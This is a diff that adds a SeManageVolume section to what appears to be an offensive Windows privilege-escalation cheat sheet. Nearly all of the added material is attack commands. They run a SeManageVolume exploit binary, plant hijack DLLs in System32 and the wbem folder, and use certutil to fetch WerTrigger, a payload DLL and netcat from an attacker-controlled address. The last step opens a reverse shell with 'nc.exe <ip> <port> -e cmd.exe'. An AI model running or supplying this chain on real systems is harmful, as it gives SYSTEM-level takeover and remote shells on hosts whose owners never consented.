@@ -179,6 +179,36 @@ windows + u
 ```
 ---
 # SeManageVolume
+```powershell
+. .\EnableAllTokenPrivs.ps1
+
+.\SeManageVolumeExploit.exe
+
+icacls c:\windows
+
+copy tzres.dll C:\Windows\System32\wbem\
+
+systeminfo
+```
+```powershell
+. .\EnableAllTokenPrivs.ps1
+
+.\SeManageVolumeExploit.exe
+
+icacls c:\windows
+
+certutil -urlcache -f http://[IP-ADDRESS]:80/WerTrigger.exe WerTrigger.exe
+certutil -urlcache -f http://[IP-ADDRESS]:80/phoneinfo.dll phoneinfo.dll
+certutil -urlcache -f http://[IP-ADDRESS]:80/nc.exe nc.exe
+certutil -urlcache -f http://[IP-ADDRESS]:80/Report.wer Report.wer
+
+copy phoneinfo.dll c:\windows\system32\
+
+dir c:\windows\system32\phoneinfo.dll
+
+.\wertrigger.exe
+c:\temp\nc.exe <ip> <port> -e cmd.exe
+```
 - https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/
 ---
 # Server Operators Group
